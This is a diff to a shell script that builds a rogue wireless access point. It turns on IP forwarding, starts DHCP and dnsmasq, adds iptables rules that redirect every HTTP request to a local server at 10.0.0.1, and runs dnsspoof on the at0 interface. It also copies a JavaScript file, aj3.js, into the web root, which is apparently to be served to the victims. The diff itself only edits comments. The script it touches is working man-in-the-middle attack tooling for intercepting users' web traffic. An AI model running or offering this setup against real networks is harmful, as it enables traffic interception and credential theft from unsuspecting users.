@@ -11,13 +11,16 @@ cp aj3.js /var/www/html/
 ifconfig at0 10.0.0.1 up
 #setup the netmask
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
-#allow Routing and forwarding in this machine
+#Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 #copy the conf file to the dhcp directory
 cp ./conf/dhcpd.conf /etc/dhcp/
-#apply the dnsmasq.conf 
+
+#Start dhcpd Listener
+#Here -C stands for Configuration file and -d stands for daemon mode
 dnsmasq -C ./conf/dnsmasq.conf -d
+
 #killall dnsmasq dhcpd isc-dhcp-server
 /etc/init.d/dnsmasq start
 
@@ -31,5 +34,5 @@ iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
 iptables -t nat -A POSTROUTING -j MASQUERADE
 
-
+#redirect all HTTP traffic coming from the at0 interface.
 dnsspoof -i at0
